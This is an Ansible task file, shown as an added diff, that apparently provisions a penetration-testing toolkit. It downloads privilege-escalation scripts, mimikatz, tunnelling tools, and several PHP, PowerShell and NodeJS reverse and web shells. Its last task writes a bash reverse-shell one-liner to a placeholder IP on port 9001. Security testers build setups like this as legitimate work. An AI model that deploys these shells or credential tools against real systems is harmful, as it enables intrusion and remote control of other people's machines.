@@ -1,0 +1,135 @@
+# roles/install_tools/tasks/download_binaries.yml
+---
+- name: Check if the Tools directory exists
+  ansible.builtin.stat:
+    path: "{{ tools_dir }}"
+  register: tools_dir_stat
+
+- name: Create tools directories
+  ansible.builtin.file:
+    path: "{{ tools_dir }}/{{ item }}"
+    state: directory
+    mode: "0755"
+  loop:
+    - "pspy"
+    - "WindowsReverseShells"
+    - "NodeJS_Shells"
+    - "chisel"
+    - "mimikatz-binaries"
+    - "aquatone"
+
+- name: Download linpeas.sh script
+  ansible.builtin.get_url:
+    url: "https://github.com/carlospolop/PEASS-ng/releases/download/{{ peas_version }}/linpeas.sh"
+    dest: "{{ tools_dir }}/linpeas.sh"
+    mode: "0755"
+
+- name: Download winpeas binaries
+  ansible.builtin.get_url:
+    url: "{{ item }}"
+    dest: "{{ tools_dir }}/{{ item | basename }}"
+    mode: "0755"
+  loop:
+    - "https://github.com/carlospolop/PEASS-ng/releases/download/{{ peas_version }}/winPEAS.bat"
+    - "https://github.com/carlospolop/PEASS-ng/releases/download/{{ peas_version }}/winPEASany.exe"
+
+- name: Download Ivank Sineck PHP Rev shell
+  ansible.builtin.get_url:
+    url: "https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php"
+    dest: "{{ tools_dir }}/ivan_sineck_revshell.php"
+    mode: "0755"
+
+- name: Download pspy
+  ansible.builtin.get_url:
+    url: "{{ item }}"
+    dest: "{{ tools_dir }}/pspy/{{ item | basename }}"
+    mode: "0755"
+  loop:
+    - "https://github.com/DominicBreuker/pspy/releases/download/v{{ pspy_version }}/pspy32"
+    - "https://github.com/DominicBreuker/pspy/releases/download/v{{ pspy_version }}/pspy64"
+    - "https://github.com/DominicBreuker/pspy/releases/download/v{{ pspy_version }}/pspy32s"
+    - "https://github.com/DominicBreuker/pspy/releases/download/v{{ pspy_version }}/pspy64s"
+
+- name: Download windows reverse shells
+  ansible.builtin.get_url:
+    url: "{{ item }}"
+    dest: "{{ tools_dir }}/WindowsReverseShells/{{ item | basename }}"
+    mode: "0755"
+  loop:
+    - "https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php"
+    - "https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php"
+    - "https://gist.githubusercontent.com/Serizao/6a63f35715a8219be6b97da3e51567e7/raw/29fbedc0dbff471122297c0a121aacc6abce7a26/mini-reverse.ps1"
+    - "https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php"
+    - "https://gist.githubusercontent.com/devzspy/a85856e6f17eeefb328b2c37810db6f6/raw/17091da536e5e22f04a4f3181d1b89a75f92e1d2/php-shell.php"
+
+- name: Download NodeJS Shells scripts
+  ansible.builtin.get_url:
+    url: "{{ item }}"
+    dest: "{{ tools_dir }}/NodeJS_Shells/{{ item | basename }}"
+    mode: "0755"
+  loop:
+    - "https://gitlab.com/0x4ndr3/blog/raw/master/JSgen/JSgen.py"
+    - "https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py"
+
+- name: Download Archives
+  ansible.builtin.get_url:
+    url: "{{ item }}"
+    # dest: "{{ tools_dir }}/mimikatz-binaries/{{ item | basename }}"
+    dest: "/tmp/{{ item | basename }}"
+    mode: "0755"
+  loop:
+    - "https://github.com/gentilkiwi/mimikatz/releases/download/{{ mimikatz_version }}/mimikatz_trunk.zip"
+    - "https://github.com/michenriksen/aquatone/releases/download/v{{ aquatone_version }}/aquatone_linux_amd64_{{ aquatone_version }}.zip"
+
+- name: Extract Archives
+  ansible.builtin.unarchive:
+    remote_src: true
+    src: "{{ item.src }}"
+    dest: "{{ item.dest }}"
+  loop:
+    - src: "/tmp/mimikatz_trunk.zip"
+      dest: "{{ tools_dir }}/mimikatz-binaries/"
+    - src: "/tmp/aquatone_linux_amd64_{{ aquatone_version }}.zip"
+      dest: "{{ tools_dir }}/aquatone"
+
+# unarchive supports .tar.gz but not .gz alone
+#
+- name: Download chisel archives
+  ansible.builtin.get_url:
+    url: "https://github.com/jpillora/chisel/releases/download/v{{ chisel_version }}/chisel_{{ chisel_version }}_linux_amd64.gz"
+    dest: "/tmp/chisel_{{ chisel_version }}_linux_amd64.gz"
+    mode: "0755"
+
+- name: Extract chisel archives
+  ansible.builtin.shell:
+    chdir: "{{ tools_dir }}/chisel/"
+    cmd: "gunzip -d --no-name /tmp/chisel_{{ chisel_version }}_linux_amd64.gz"
+    creates: "chisel_{{ chisel_version }}_linux_amd64"
+# noqa: command-instead-of-shell
+
+- name: Create Burpsuite directory
+  ansible.builtin.file:
+    path: "{{ tools_dir }}/Burpsuite"
+    state: directory
+    mode: "0755"
+
+- name: Download Burp binaries "{{ jython_version }}"
+  ansible.builtin.get_url:
+    url: "{{ item }}"
+    dest: "{{ tools_dir }}/Burpsuite/{{ item | basename }}"
+    mode: "0755"
+  loop:
+    - "https://repo1.maven.org/maven2/org/python/jython-standalone/{{ jython_version }}/jython-standalone-{{ jython_version }}.jar"
+    - "https://portswigger-cdn.net/burp/releases/download?product=community&version={{ burpsuite_version }}&type=Jar"
+      # java -jar -Xmx2G /home/kali/Tools/Burpsuite/burpsuite_community_v2023.2.4.jar
+  # when: not item.stat.exists
+
+- name: Create shell.sh
+  ansible.builtin.blockinfile:
+    path: "{{ tools_dir }}/shell.sh"
+    block: |
+      #!/usr/bin/env sh
+      bash -c 'exec bash -i &>/dev/tcp/IP/9001 <&1'
+    backup: false
+    create: true
+    mode: "0755"
